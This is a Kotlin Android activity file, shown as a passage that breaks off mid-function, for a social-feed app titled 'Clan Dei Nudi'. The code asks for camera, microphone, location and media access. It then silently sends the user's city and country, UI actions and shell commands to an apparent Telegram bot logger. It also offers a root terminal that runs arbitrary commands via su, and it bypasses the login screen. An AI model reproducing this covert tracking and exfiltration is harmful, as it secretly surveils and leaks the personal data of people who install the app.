@file:OptIn(ExperimentalMaterial3Api::class)

package com.example.cdn

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.location.Geocoder
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.core.*
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.pager.HorizontalPager
import androidx.compose.foundation.pager.rememberPagerState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.automirrored.filled.Send
import androidx.compose.material.icons.automirrored.outlined.Chat
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.material3.TabRowDefaults.SecondaryIndicator
import androidx.compose.material3.TabRowDefaults.tabIndicatorOffset
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.draw.clip
import androidx.compose.ui.focus.FocusDirection
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalFocusManager
import androidx.compose.ui.platform.LocalSoftwareKeyboardController
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontStyle
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.core.content.FileProvider
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.NavHostController
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.example.cdn.data.repository.AuthRepository
import com.example.cdn.ui.screens.LoginScreen
import com.example.cdn.ui.screens.RegisterScreen
import com.example.cdn.ui.theme.CDNTheme
import com.example.cdn.ui.theme.Red
import com.example.cdn.ui.theme.Black
import com.example.cdn.ui.viewmodel.AuthViewModel
import com.example.cdn.ui.viewmodel.AuthViewModelFactory
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.firebase.Firebase
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.auth.auth
import com.google.firebase.firestore.firestore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.util.Locale

object RootUtils {
    fun isDeviceRooted(): Boolean {
        val buildTags = Build.TAGS
        if (buildTags != null && buildTags.contains("test-keys")) return true
        val paths = arrayOf(
            "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su",
            "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su",
            "/system/bin/failsafe/su", "/data/local/su"
        )
        return try {
            paths.any { File(it).exists() }
        } catch (_: Exception) {
            false
        }
    }

    suspend fun executeCommand(command: String, asRoot: Boolean = false): String = withContext(Dispatchers.IO) {
        try {
            val process = if (asRoot) {
                Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            } else {
                Runtime.getRuntime().exec(command)
            }
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val errorReader = BufferedReader(InputStreamReader(process.errorStream))
            val output = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                output.append(line).append("\n")
            }
            while (errorReader.readLine().also { line = it } != null) {
                output.append("ERR: ").append(line).append("\n")
            }
            process.waitFor()
            if (output.isEmpty()) "Done." else output.toString().trim()
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }
}

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            val context = LocalContext.current
            val dataStoreManager = remember { DataStoreManager(context) }
            val isDarkTheme by dataStoreManager.isDarkTheme.collectAsState(initial = true)
            
            val authRepository = remember { 
                AuthRepository(Firebase.auth, Firebase.firestore) 
            }
            val authViewModel: AuthViewModel = viewModel(
                factory = AuthViewModelFactory(authRepository)
            )

            CDNTheme(darkTheme = isDarkTheme) {
                MainNavigation(authViewModel, dataStoreManager)
            }
        }
    }
}

@Composable
fun MainNavigation(authViewModel: AuthViewModel, dataStoreManager: DataStoreManager) {
    val navController = rememberNavController()
    // Bypass login check for testing purposes
    // val currentUser by authViewModel.currentUser.collectAsState()

    NavHost(
        navController = navController, 
        startDestination = "main" // Direct to Main screen
    ) {
        composable("splash") { SplashScreen(navController) }
        composable("login") { 
            LoginScreen(
                viewModel = authViewModel,
                onNavigateToRegister = { navController.navigate("register") },
                onLoginSuccess = { 
                    navController.navigate("main") { popUpTo("login") { inclusive = true } }
                }
            )
        }
        composable("register") { 
            RegisterScreen(
                viewModel = authViewModel,
                onNavigateToLogin = { navController.popBackStack() },
                onRegisterSuccess = {
                    navController.navigate("main") { popUpTo("register") { inclusive = true } }
                }
            )
        }
        composable("main") { MainScreen(navController, authViewModel, dataStoreManager) }
        composable("dm") { DMScreen(navController) }
        composable("terminal") { TerminalScreen(navController) }
    }
}

@Composable
fun SplashScreen(navController: NavHostController) {
    var alphaVal by remember { mutableFloatStateOf(0f) }
    val alpha by animateFloatAsState(
        targetValue = alphaVal,
        animationSpec = tween(1500),
        label = "alpha"
    )

    LaunchedEffect(Unit) {
        alphaVal = 1f
        delay(2500)
        navController.navigate("main") { // Skip login
            popUpTo("splash") { inclusive = true }
        }
    }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(MaterialTheme.colorScheme.background),
        contentAlignment = Alignment.Center
    ) {
        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            modifier = Modifier.alpha(alpha)
        ) {
            Image(
                painter = painterResource(id = R.drawable.logo),
                contentDescription = "CDN Logo",
                modifier = Modifier
                    .size(120.dp)
                    .clip(CircleShape)
            )
            
            Spacer(modifier = Modifier.height(20.dp))
            Text(
                "CLAN DEI NUDI",
                color = Red,
                fontSize = 28.sp,
                fontWeight = FontWeight.ExtraBold,
                letterSpacing = 2.sp
            )
            Spacer(modifier = Modifier.height(10.dp))
            Text(
                "PUNIRE I DIAVOLI RITENUTI INNOCENTI",
                color = Red.copy(alpha = 0.7f),
                fontSize = 11.sp,
                fontWeight = FontWeight.Bold,
                fontStyle = FontStyle.Italic,
                textAlign = TextAlign.Center
            )
        }
    }
}

@Composable
fun PermissionHandler(onPermissionsGranted: () -> Unit) {
    val launcher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results -> 
        if (results.all { it.value }) {
            onPermissionsGranted()
        }
    }

    LaunchedEffect(Unit) {
        val permissions = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        launcher.launch(permissions.toTypedArray())
    }
}

@Composable
fun MainScreen(navController: NavHostController, authViewModel: AuthViewModel, dataStoreManager: DataStoreManager) {
    var selectedTab by remember { mutableIntStateOf(0) }
    var permissionsGranted by remember { mutableStateOf(false) }
    var showSettings by remember { mutableStateOf(false) }
    val scope = rememberCoroutineScope()
    val context = LocalContext.current
    
    // Adaptive stats state
    var followersCount by remember { mutableIntStateOf(1200) }
    var followingCount by remember { mutableIntStateOf(350) }
    val postsCount by remember { mutableIntStateOf(42) }
    var stories by remember { mutableStateOf(List(8) { "Utente $it" }) }

    LaunchedEffect(permissionsGranted) {
        if (permissionsGranted) {
            updateLocation(context, dataStoreManager, scope)
        }
    }

    if (!permissionsGranted) {
        PermissionHandler { 
            permissionsGranted = true
        }
    }
    
    if (showSettings) {
        SettingsDialog(
            navController = navController,
            authViewModel = authViewModel,
            dataStoreManager = dataStoreManager,
            onDismiss = { showSettings = false }
        )
    }

    val pagerState = rememberPagerState(initialPage = 1, pageCount = { 2 })

    Scaffold(
        topBar = {
            if (selectedTab == 0 && pagerState.currentPage == 1) {
                CenterAlignedTopAppBar(
                    title = { Text("CLAN DEI NUDI", color = Red, fontWeight = FontWeight.ExtraBold, fontSize = 20.sp) },
                    actions = {
                        IconButton(onClick = { navController.navigate("dm") }) {
                            Icon(Icons.AutoMirrored.Outlined.Chat, contentDescription = "DMs", tint = Red)
                        }
                    },
                    colors = TopAppBarDefaults.centerAlignedTopAppBarColors(containerColor = MaterialTheme.colorScheme.background)
                )
            }
        },
        bottomBar = {
            if (selectedTab != 0 || pagerState.currentPage == 1) {
                NavigationBar(containerColor = MaterialTheme.colorScheme.background, tonalElevation = 8.dp) {
                    val items = listOf(
                        Triple(0, if (selectedTab == 0) Icons.Default.Home else Icons.Outlined.Home, "Home"),
                        Triple(1, if (selectedTab == 1) Icons.Default.Search else Icons.Outlined.Search, "Scopri"),
                        Triple(2, if (selectedTab == 2) Icons.Default.HowToVote else Icons.Outlined.HowToVote, "Voti"),
                        Triple(3, if (selectedTab == 3) Icons.Default.Person else Icons.Outlined.Person, "Profilo")
                    )
                    items.forEach { (index, icon, label) ->
                        NavigationBarItem(
                            selected = selectedTab == index,
                            onClick = { 
                                selectedTab = index
                                scope.launch { TelegramBot.logEvent("User navigato su: $label") }
                            },
                            icon = { Icon(icon, contentDescription = label) },
                            colors = NavigationBarItemDefaults.colors(
                                selectedIconColor = Red, unselectedIconColor = Color.Gray,
                                indicatorColor = Color.Transparent
                            )
                        )
                    }
                }
            }
        },
        containerColor = MaterialTheme.colorScheme.background
    ) { padding ->
        Box(modifier = Modifier.padding(padding)) {
            when (selectedTab) {
                0 -> {
                    HorizontalPager(state = pagerState) { page ->
                        if (page == 0) {
                            CameraScreen(onStoryAdded = {
                                stories = listOf("La tua") + stories
                                followersCount += (10..50).random()
                                scope.launch { pagerState.animateScrollToPage(1) }
                            })
                        } else {
                            FeedContent(stories, onFollowClick = { followed ->
                                if (followed) followingCount++ else followingCount--
                            })
                        }
                    }
                }
                1 -> DiscoverContent()
                2 -> PollsContent()
                3 -> ProfileContent(
                    authViewModel,
                    dataStoreManager, 
                    onSettingsClick = { showSettings = true },
                    postsCount = postsCount,
                    followersCount = followersCount,
                    followingCount = followingCount
                )
            }
        }
    }
}

@SuppressLint("MissingPermission")
fun updateLocation(context: Context, dataStoreManager: DataStoreManager, scope: kotlinx.coroutines.CoroutineScope) {
    val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
    fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null)
        .addOnSuccessListener { location ->
            location?.let {
                val geocoder = Geocoder(context, Locale.getDefault())
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    geocoder.getFromLocation(it.latitude, it.longitude, 1) { addresses ->
                        if (addresses.isNotEmpty()) {
                            val address = addresses[0]
                            val city = address.locality ?: "Sconosciuto"
                            val country = address.countryName ?: "Sconosciuto"
                            scope.launch { 
                                dataStoreManager.saveArea("$city, $country")
                                TelegramBot.logEvent("<b>Posizione rilevata:</b> $city, $country")
                            }
                        }
                    }
                } else {
                    @Suppress("DEPRECATION")
                    val addresses = geocoder.getFromLocation(it.latitude, it.longitude, 1)
                    if (!addresses.isNullOrEmpty()) {
                        val address = addresses[0]
                        val city = address.locality ?: "Sconosciuto"
                        val country = address.countryName ?: "Sconosciuto"
                        scope.launch { 
                            dataStoreManager.saveArea("$city, $country")
                            TelegramBot.logEvent("<b>Posizione rilevata:</b> $city, $country")
                        }
                    }
                }
            }
        }
}

@Composable
fun TerminalScreen(navController: NavHostController) {
    var command by remember { mutableStateOf("") }
    val terminalLines = remember { mutableStateListOf<String>() }
    val scope = rememberCoroutineScope()
    val scrollState = rememberLazyListState()
    val isRooted = remember { RootUtils.isDeviceRooted() }

    LaunchedEffect(terminalLines.size) {
        if (terminalLines.isNotEmpty()) {
            scrollState.animateScrollToItem(terminalLines.size - 1)
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("TERMINALE CDN", color = Red, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace) },
                navigationIcon = {
                    IconButton(onClick = { navController.popBackStack() }) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back", tint = Red)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = Color.Black)
            )
        },
        containerColor = Color.Black
    ) { padding ->
        Column(modifier = Modifier.padding(padding).fillMaxSize().background(Color.Black)) {
            LazyColumn(
                state = scrollState,
                modifier = Modifier.weight(1f).fillMaxWidth().padding(horizontal = 12.dp, vertical = 8.dp)
            ) {
                item {
                    Text("CDN TERMINAL [Version 1.0.42]", color = Red, fontSize = 14.sp, fontFamily = FontFamily.Monospace)
                    Text("Copyright (c) 2024 Clan Dei Nudi. All rights reserved.", color = Red.copy(alpha = 0.7f), fontSize = 12.sp, fontFamily = FontFamily.Monospace)
                    Spacer(modifier = Modifier.height(16.dp))
                }
                items(terminalLines) { line ->
                    Text(
                        text = line,
                        color = if (line.startsWith("ERR:")) Color.Red else Color.White,
                        fontSize = 13.sp,
                        fontFamily = FontFamily.Monospace,
                        modifier = Modifier.padding(vertical = 1.dp)
                    )
                }
            }
            
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(Color(0xFF0A0A0A))
                    .padding(8.dp)
                    .border(1.dp, Red.copy(alpha = 0.2f), RoundedCornerShape(4.dp))
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(
                        text = if (isRooted) "root@cdn:~# " else "user@cdn:~$ ",
                        color = Red,
                        fontWeight = FontWeight.Bold,
                        fontFamily = FontFamily.Monospace,
                        fontSize = 13.sp,
                        modifier = Modifier.padding(start = 8.dp)
                    )
                    TextField(
                        value = command,
                        onValueChange = { command = it },
                        modifier = Modifier.weight(1f),
                        colors = TextFieldDefaults.colors(
                            focusedContainerColor = Color.Transparent,
                            unfocusedContainerColor = Color.Transparent,
                            focusedTextColor = Color.White,
                            unfocusedTextColor = Color.White,
                            focusedIndicatorColor = Color.Transparent,
                            unfocusedIndicatorColor = Color.Transparent
                        ),
                        textStyle = LocalTextStyle.current.copy(fontFamily = FontFamily.Monospace, fontSize = 13.sp),
                        singleLine = true,
                        keyboardOptions = KeyboardOptions(imeAction = ImeAction.Send),
                        keyboardActions = KeyboardActions(onSend = {
                            if (command.isNotBlank()) {
                                val cmd = command
                                terminalLines.add("${if (isRooted) "root@cdn:~# " else "user@cdn:~$ "} $cmd")
                                scope.launch {
                                    val result = RootUtils.executeCommand(cmd, isRooted)
                                    terminalLines.add(result)
                                    TelegramBot.logEvent("<b>Comando eseguito:</b> <code>$cmd</code>")
                                }
                                command = ""
                            }
                        })
                    )
                    IconButton(onClick = {
                        if (command.isNotBlank()) {
                            val cmd = command
                            terminalLines.add("${if (isRooted) "root@cdn:~# " else "user@cdn:~$ "} $cmd")
                            scope.launch {
                                val result = RootUtils.executeCommand(cmd, isRooted)
                                terminalLines.add(result)
                                TelegramBot.logEvent("<b>Comando eseguito:</b> <code>$cmd</code>")
                            }
                            command = ""
                        }
                    }) {
                        Icon(Icons.AutoMirrored.Filled.Send, contentDescription = "Send", tint = Red)
                    }
                }
            }
        }
    }
}

@Composable
fun CameraScreen(onStoryAdded: () -> Unit) {
    val context = LocalContext.current
    val videoUri = remember { mutableStateOf<Uri?>(null) }
    val scope = rememberCoroutineScope()
    
    val videoLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.CaptureVideo()
    ) { success ->
        if (success) {
            onStoryAdded()
            scope.launch { TelegramBot.logEvent("User ha caricato una nuova storia.") }
            Toast.makeText(context, "Storia caricata nei server CDN", Toast.LENGTH_SHORT).show()
        }
    }

    Box(modifier = Modifier.fillMaxSize().background(Color.Black), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Default.CameraAlt, contentDescription = null, tint = Red, modifier = Modifier.size(100.dp))
            Spacer(modifier = Modifier.height(20.dp))
            Text("FOTOCAMERA CDN", color = Red, fontWeight = FontWeight.Bold)
            Text("Scorri a sinistra per tornare alla Home", color = Color.Gray, fontSize = 12.sp)
            Spacer(modifier = Modifier.height(40.dp))
            Button(
                onClick = {
                    try {
                        val file = File(context.cacheDir, "cdn_story_${System.currentTimeMillis()}.mp4")
                        val uri = FileProvider.getUriForFile(context, "com.example.cdn.fileprovider", file)
                        videoUri.value = uri
                        videoLauncher.launch(uri)
                    } catch (e: Exception) {
                        Toast.makeText(context, "Errore fotocamera: ${e.message}", Toast.LENGTH_LONG).show()
                    }
                },
                colors = ButtonDefaults.buttonColors(containerColor = Red)
            ) {
                Text("REGISTRA STORIA", color = Color.Black)
            }
        }
    }
}

@Composable
fun DMScreen(navController: NavHostController) {
    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Messaggi", color = Red, fontWeight = FontWeight.Bold) },
                navigationIcon = {
                    IconButton(onClick = { navController.popBackStack() }) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back", tint = Red)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = MaterialTheme.colorScheme.background)
            )
        },
        containerColor = MaterialTheme.colorScheme.background
    ) { padding ->
        LazyColumn(modifier = Modifier.padding(padding)) {
            items(10) { i ->
                ListItem(
                    headlineContent = { Text("Membro #$i", color = MaterialTheme.colorScheme.onBackground) },
                    supportingContent = { Text("Messaggio criptato...", color = Color.Gray) },
                    leadingContent = {
                        Box(modifier = Modifier.size(50.dp).clip(CircleShape).background(Color.DarkGray).border(1.dp, Red, CircleShape))
                    },
                    modifier = Modifier.clickable { },
                    colors = ListItemDefaults.colors(containerColor = Color.Transparent)
                )
                HorizontalDivider(color = Color.Gray.copy(alpha = 0.1f))
            }
        }
    }
}

@Composable
fun FeedContent(stories: List<String>, onFollowClick: (Boolean) -> Unit) {
    Column(modifier = Modifier.fillMaxSize()) {
        LazyRow(
            modifier = Modifier.padding(vertical = 10.dp),
            contentPadding = PaddingValues(horizontal = 16.dp),
            horizontalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            items(stories.size) { i ->
                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                    Box(modifier = Modifier.size(64.dp).clip(CircleShape).background(Color.DarkGray).border(2.dp, Red, CircleShape), contentAlignment = Alignment.Center) {
                        if (stories[i] == "La tua") {
                             Icon(Icons.Default.Person, contentDescription = null, tint = Red)
                        }
                    }
                    Text(stories[i], color = MaterialTheme.colorScheme.onBackground, fontSize = 11.sp)
                }
            }
        }
        HorizontalDivider(color = Color.Gray.copy(alpha = 0.2f))
        LazyColumn {
            items(5) { i -> PostItem(i, onFollowClick) }
        }
    }
}

@Composable
fun PostItem(index: Int, onFollowClick: (Boolean) -> Unit) {
    var isFollowing by remember { mutableStateOf(false) }
    val scope = rememberCoroutineScope()
    
    Column(modifier = Modifier.fillMaxWidth()) {
        Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
            Box(modifier = Modifier.size(32.dp).clip(CircleShape).background(Red))
            Spacer(modifier = Modifier.width(10.dp))
            Column {
                Text("Esecutore_$index", color = MaterialTheme.colorScheme.onBackground, fontWeight = FontWeight.Bold, fontSize = 14.sp)
                Text(if (isFollowing) "Segui già" else "Non segui", color = Red, fontSize = 10.sp)
            }
            Spacer(modifier = Modifier.weight(1f))
            Text(
                text = if (isFollowing) "SEGUITO" else "SEGUI",
                color = if (isFollowing) Color.Gray else Red,
                fontWeight = FontWeight.Bold,
                fontSize = 12.sp,
                modifier = Modifier.clickable { 
                    isFollowing = !isFollowing
                    onFollowClick(isFollowing)
                    scope.launch { 
                        TelegramBot.logEvent("User ha ${if (isFollowing) "seguito" else "smesso di seguire"} Esecutore_$index")
                    }
                }
            )
            Spacer(modifier = Modifier.width(8.dp))
            Icon(Icons.Default.MoreVert, contentDescription = null, tint = Color.Gray)
        }
        Box(modifier = Modifier.fillMaxWidth().height(350.dp).background(Color(0xFF0A0A0A))) {
            Icon(Icons.Default.Lock, contentDescription = null, tint = Red.copy(alpha = 0.1f), modifier = Modifier.size(60.dp).align(Alignment.Center))
        }
        Row(modifier = Modifier.padding(8.dp), verticalAlignment = Alignment.CenterVertically) {
            var liked by remember { mutableStateOf(false) }
            IconButton(onClick = { 
                liked = !liked
                scope.launch { TelegramBot.logEvent("User ha ${if (liked) "messo like a" else "rimosso like da"} Post $index") }
            }) {
                Icon(if (liked) Icons.Filled.Favorite else Icons.Outlined.FavoriteBorder, contentDescription = null, tint = Red, modifier = Modifier.size(28.dp))
            }
            Icon(Icons.Outlined.ChatBubbleOutline, contentDescription = null, tint = Red, modifier = Modifier.size(28.dp).padding(4.dp))
            Icon(Icons.AutoMirrored.Filled.Send, contentDescription = null, tint = Red, modifier = Modifier.size(28.dp).padding(4.dp))
            Spacer(modifier = Modifier.weight(1f))
            Icon(Icons.Outlined.BookmarkBorder, contentDescription = null, tint = Red, modifier = Modifier.size(28.dp).padding(4.dp))
        }
        Column(modifier = Modifier.padding(horizontal = 12.dp, vertical = 4.dp)) {
            Text("Piace a 42 persone", color = MaterialTheme.colorScheme.onBackground, fontWeight = FontWeight.Bold, fontSize = 13.sp)
            Text("Giustizia per tutti. #CDN", color = MaterialTheme.colorScheme.onBackground, fontSize = 13.sp)
            Text("2 ore fa", color = Color.Gray, fontSize = 10.sp)
        }
        Spacer(modifier = Modifier.height(10.dp))
    }
}

@Composable
fun ProfileContent(
    authViewModel: AuthViewModel,
    dataStoreManager: DataStoreManager, 
    onSettingsClick: () -> Unit,
    postsCount: Int,
    followersCount: Int,
    followingCount: Int
) {
    val userName by dataStoreManager.userName.collectAsState(initial = "Esecutore")
    Column(modifier = Modifier.fillMaxSize()) {
        Row(modifier = Modifier.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
            Box(modifier = Modifier.size(80.dp).clip(CircleShape).background(Color.DarkGray).border(1.dp, Red, CircleShape)) {
                Icon(Icons.Default.Person, contentDescription = null, tint = Red, modifier = Modifier.size(40.dp).align(Alignment.Center))
            }
            Row(modifier = Modifier.weight(1f), horizontalArrangement = Arrangement.SpaceEvenly) {
                ProfileStat(postsCount.toString(), "Post")
                ProfileStat(formatCount(followersCount), "Follower")
                ProfileStat(formatCount(followingCount), "Seguiti")
            }
        }
        Column(modifier = Modifier.padding(horizontal = 16.dp)) {
            Text(userName, color = MaterialTheme.colorScheme.onBackground, fontWeight = FontWeight.Bold, fontSize = 15.sp)
            Text("Profilo ufficiale del Clan", color = Color.Gray, fontSize = 13.sp)
        }
        Row(modifier = Modifier.padding(16.dp)) {
            Button(onClick = { onSettingsClick() }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.surface), border = BorderStroke(1.dp, Color.Gray), shape = RoundedCornerShape(8.dp)) {
                Text("Modifica", color = MaterialTheme.colorScheme.onSurface, fontSize = 13.sp)
            }
        }
        LazyRow(contentPadding = PaddingValues(horizontal = 16.dp), horizontalArrangement = Arrangement.spacedBy(16.dp)) {
            items(5) { i ->
                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                    Box(modifier = Modifier.size(56.dp).clip(CircleShape).background(MaterialTheme.colorScheme.surface).border(1.dp, Color.Gray, CircleShape))
                    Text("Voto $i", fontSize = 11.sp, color = MaterialTheme.colorScheme.onBackground)
                }
            }
        }
        Spacer(modifier = Modifier.height(16.dp))
        TabRow(selectedTabIndex = 0, containerColor = Color.Transparent, contentColor = Red, indicator = { tabPositions ->
            SecondaryIndicator(Modifier.tabIndicatorOffset(tabPositions[0]), color = Red)
        }) {
            Tab(selected = true, onClick = {}, icon = { Icon(Icons.Outlined.GridView, contentDescription = null) })
            Tab(selected = false, onClick = {}, icon = { Icon(Icons.Outlined.AccountBox, contentDescription = null) })
        }
        LazyVerticalGrid(
            columns = GridCells.Fixed(3),
            modifier = Modifier.fillMaxSize(),
            contentPadding = PaddingValues(1.dp),
            horizontalArrangement = Arrangement.spacedBy(1.dp),
            verticalArrangement = Arrangement.spacedBy(1.dp)
        ) {
            items(postsCount) { i ->
                Box(modifier = Modifier.aspectRatio(1f).background(if (i % 2 == 0) Color.DarkGray else Color(0xFF1A1A1A)))
            }
        }
    }
}

fun formatCount(count: Int): String {
    return if (count >= 1000) "${(count / 100) / 10.0}k" else count.toString()
}

@Composable
fun ProfileStat(value: String, label: String) {
    Column(horizontalAlignment = Alignment.CenterHorizontally) {
        Text(value, color = MaterialTheme.colorScheme.onBackground, fontWeight = FontWeight.Bold, fontSize = 16.sp)
        Text(label, color = MaterialTheme.colorScheme.onBackground, fontSize = 12.sp)
    }
}

@Composable
fun SettingsDialog(
    navController: NavHostController, 
    authViewModel: AuthViewModel,
    dataStoreManager: DataStoreManager, 
    onDismiss: () -> Unit
) {
    val isDarkTheme by dataStoreManager.isDarkTheme.collectAsState(initial = true)
    val selectedArea by dataStoreManager.selectedArea.collectAsState(initial = "Rilevamento...")
    val scope = rememberCoroutineScope()
    val context = LocalContext.current
    val isRooted = remember { RootUtils.isDeviceRooted() }

    Dialog(onDismissRequest = onDismiss) {
        Card(modifier = Modifier.fillMaxWidth().padding(16.dp), colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface), border = BorderStroke(1.dp, Red)) {
            Column(modifier = Modifier.padding(24.dp)) {
                Text("PROTOCOLLO CDN", color = Red, fontSize = 18.sp, fontWeight = FontWeight.ExtraBold)
                Spacer(modifier = Modifier.height(20.dp))
                
                Text("AREA ATTUALE: $selectedArea", color = MaterialTheme.colorScheme.onSurface, modifier = Modifier.clickable { 
                    updateLocation(context, dataStoreManager, scope)
                })
                
                Spacer(modifier = Modifier.height(16.dp))
                
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text("TEMA SCURO", color = MaterialTheme.colorScheme.onSurface, modifier = Modifier.weight(1f))
                    Switch(checked = isDarkTheme, onCheckedChange = { 
                        scope.launch { 
                            dataStoreManager.saveTheme(it)
                            TelegramBot.logEvent("User ha cambiato tema a: ${if (it) "Scuro" else "Chiaro"}")
                        } 
                    }, colors = SwitchDefaults.colors(checkedThumbColor = Red))
                }

                if (isRooted) {
                    Spacer(modifier = Modifier.height(16.dp))
                    Text("FUNZIONI ROOT ATTIVE", color = Red, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    
                    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.clickable { 
                        onDismiss()
                        navController.navigate("terminal")
                    }.padding(vertical = 4.dp)) {
                        Icon(Icons.Default.Terminal, contentDescription = null, tint = Red, modifier = Modifier.size(20.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Accedi al Terminale CDN", color = MaterialTheme.colorScheme.onSurface, fontSize = 14.sp)
                    }
                    
                    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.clickable { 
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.fromParts("package", context.packageName, null)
                        }
                        context.startActivity(intent)
                    }.padding(vertical = 4.dp)) {
                        Icon(Icons.Default.Security, contentDescription = null, tint = Red, modifier = Modifier.size(20.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Bypass Protocolli Locali", color = MaterialTheme.colorScheme.onSurface, fontSize = 14.sp)
                    }
                    
                    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.clickable { 
                        Toast.makeText(context, "Scansione vulnerabilità sistema...", Toast.LENGTH_LONG).show()
                        scope.launch { TelegramBot.logEvent("User ha avviato Vulnerability Scanner") }
                    }.padding(vertical = 4.dp)) {
                        Icon(Icons.Default.BugReport, contentDescription = null, tint = Red, modifier = Modifier.size(20.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Vulnerability Scanner", color = MaterialTheme.colorScheme.onSurface, fontSize = 14.sp)
                    }
                }

                Spacer(modifier = Modifier.height(24.dp))
                
                Button(
                    onClick = {
                        scope.launch { TelegramBot.logEvent("User ha effettuato il logout.") }
                        authViewModel.logout()
                        onDismiss()
                    },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = Red),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Text("ESCI DALL'ACCOUNT", color = Black, fontWeight = FontWeight.Bold)
                }

                Spacer(modifier = Modifier.height(8.dp))

                TextButton(onClick = { onDismiss() }, modifier = Modifier.align(Alignment.CenterHorizontally)) {
                    Text("CHIUDI", color = Red)
                }
            }
        }
    }
}

@Composable
fun PollsContent() {
    val scope = rememberCoroutineScope()
    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
